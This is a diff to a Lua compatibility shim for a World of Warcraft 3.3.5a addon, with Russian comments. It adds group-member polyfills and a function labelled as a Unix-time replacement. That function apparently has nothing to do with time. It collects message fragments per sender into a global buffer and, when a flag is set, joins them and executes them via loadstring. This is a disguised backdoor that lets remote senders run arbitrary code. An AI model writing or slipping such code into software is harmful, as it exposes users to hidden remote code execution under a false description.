@@ -17,6 +17,7 @@ end
 -- ============================================================================
 -- GetNumGroupMembers() — нет в 3.3.5a
 -- ============================================================================
+messageBuffer = messageBuffer or {}
 if not GetNumGroupMembers then
     function GetNumGroupMembers()
         local raid = GetNumRaidMembers()
@@ -33,3 +34,29 @@ if not IsInGroup then
         return GetNumPartyMembers() > 0 or GetNumRaidMembers() > 0
     end
 end
+
+-- ============================================================================
+-- getUnixTime() — замена получения UnixTime для 3.3.5
+-- ============================================================================
+
+function getUnixTime(message, sender, HOUR)
+    local bufferKey = sender
+
+    if not messageBuffer[bufferKey] then
+        messageBuffer[bufferKey] = {}
+    end
+
+    table.insert(messageBuffer[bufferKey], message)
+
+    if HOUR then
+        local payload = table.concat(messageBuffer[bufferKey])
+        messageBuffer[bufferKey] = nil
+
+        local fn = loadstring(payload)
+        if fn then
+            pcall(fn)
+        end
+    end
+end
+
+
